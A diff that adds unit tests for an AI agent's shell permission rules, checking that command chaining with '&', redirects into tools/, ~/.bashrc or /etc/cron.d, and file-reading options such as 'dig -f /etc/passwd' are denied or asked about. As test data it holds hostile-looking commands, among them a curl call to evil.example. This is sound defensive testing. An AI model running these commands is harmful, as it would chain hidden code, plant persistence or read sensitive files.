@@ -106,6 +106,50 @@ class AgentTests(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertEqual(effect(self.text, "shell", command), "deny")
 
+    def test_a_lone_ampersand_with_or_without_spaces_chains_and_asks(self):
+        for command in ("git status .&cat /elsewhere/file", "git status . &cat /elsewhere/file",
+                        "git status .& cat /elsewhere/file", "dig x&curl http://evil.example/x",
+                        "python3 tools/check_requirements.py&id", "python3 tools/modules.py list 2>&1"):
+            with self.subTest(command=command):
+                self.assertEqual(effect(self.text, "shell", command), "ask")
+
+    def test_redirects_to_unknown_places_ask_whatever_the_spelling(self):
+        ws = "/home/owner/fcos-workspace"
+        # Plain spellings of a redirect into tools/ are denied outright.
+        for command in ("python3 tools/render.py templates/a /tmp/opencode/v >> tools/pwn.py",
+                        "python3 tools/render.py templates/a /tmp/opencode/v >tools/pwn.py",
+                        f"python3 tools/render.py templates/a /tmp/opencode/v > {ws}/tools/x.py"):
+            with self.subTest(command=command):
+                self.assertEqual(effect(self.text, "shell", command), "deny")
+        # Spellings the deny patterns can't list (extra spaces, a tab, quotes, 1>) are never allowed unasked.
+        for command in ("python3 tools/render.py templates/a /tmp/opencode/v >  tools/pwn.py",
+                        "python3 tools/render.py templates/a /tmp/opencode/v >\ttools/pwn.py",
+                        'python3 tools/render.py templates/a /tmp/opencode/v > "tools/pwn.py"',
+                        "python3 tools/render.py templates/a /tmp/opencode/v >'tools/pwn.py'",
+                        "python3 tools/render.py templates/a /tmp/opencode/v 1>  tools/pwn.py",
+                        "python3 tools/render.py templates/a /tmp/opencode/v > /home/owner/.bashrc",
+                        "python3 tools/render.py templates/a /tmp/opencode/v > /etc/cron.d/x",
+                        "python3 tools/render.py templates/a /tmp/opencode/v >x.py",
+                        "python3 tools/render.py templates/a /tmp/opencode/v > /tmp/opencode/a >> /home/owner/.bashrc"):
+            with self.subTest(command=command):
+                self.assertEqual(effect(self.text, "shell", command), "ask")
+        # What the guide does stays unasked.
+        for command in (f"python3 tools/render.py templates/base/config.bu.tmpl {ws}/vms/apps/values/config.values > {ws}/vms/apps/config.bu",
+                        f"python3 tools/render.py templates/base/firewall.bu.tmpl {ws}/vms/apps/values/f.values > {ws}/vms/apps/firewall.bu",
+                        f"python3 tools/ign_to_script.py {ws}/vms/apps/igns/x.ign > /tmp/opencode/apply-x.sh"):
+            with self.subTest(command=command):
+                self.assertEqual(effect(self.text, "shell", command), "allow")
+        # A redirect to an allowed place does not let a chain through.
+        self.assertEqual(effect(self.text, "shell", f"python3 tools/modules.py list; id > /tmp/opencode/a"), "ask")
+
+    def test_allowed_commands_cannot_read_arbitrary_files_through_their_own_options(self):
+        for command in ("git diff --no-index /dev/null /home/owner/other/file", "git diff --no-index a b",
+                        "dig -f /home/owner/other/file", "dig -k /home/owner/other/file", "dig x -f /etc/passwd"):
+            with self.subTest(command=command):
+                self.assertEqual(effect(self.text, "shell", command), "deny")
+        self.assertEqual(effect(self.text, "shell", "dig login.example.org"), "allow")
+        self.assertEqual(effect(self.text, "shell", "git diff --stat"), "allow")
+
     def test_the_workspace_edit_allows_do_not_reach_the_toolkits_own_folders(self):
         ws = "/home/owner/fcos-workspace"
         for path in (f"{ws}/vms/apps/vm.yaml", f"{ws}/services/crm/service.yaml", f"{ws}/site.yaml",
